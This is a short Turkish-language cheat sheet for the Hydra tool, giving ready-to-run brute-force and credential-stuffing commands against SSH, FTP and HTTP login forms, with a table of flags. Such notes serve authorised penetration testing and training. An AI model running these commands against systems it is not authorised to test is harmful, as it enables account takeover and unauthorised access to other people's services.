# Hydra Cheatsheet

Online brute force / credential stuffing aracı.

## Temel Kullanım

```bash
hydra -l <kullanıcı> -P <wordlist> <protokol>://<ip>
```

## SSH Brute Force

```bash
# Tek kullanıcı, wordlist
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<ip>

# Farklı port
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<ip> -s 2222

# Kullanıcı listesi
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<ip>
```

## FTP Brute Force

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<ip>
```

## HTTP Form Brute Force

```bash
# POST form
hydra -l admin -P /usr/share/wordlists/rockyou.txt <ip> http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# ^USER^ ve ^PASS^ → hydra bunları değiştirir
# Son kısım = başarısız login mesajı (bunu sayfadan bul)
```

## Önemli Flagler

| Flag | Ne yapar? |
|---|---|
| `-l` | Tek kullanıcı adı |
| `-L` | Kullanıcı listesi dosyası |
| `-p` | Tek şifre |
| `-P` | Şifre listesi (wordlist) |
| `-s` | Port numarası |
| `-t` | Thread sayısı (varsayılan 16) |
| `-f` | İlk başarılı bulunca dur |
| `-V` | Her denemeyi göster (verbose) |

## Desteklenen Protokoller

```
ssh, ftp, http-get, http-post-form, 
mysql, smb, rdp, telnet, vnc, pop3, imap, smtp
```
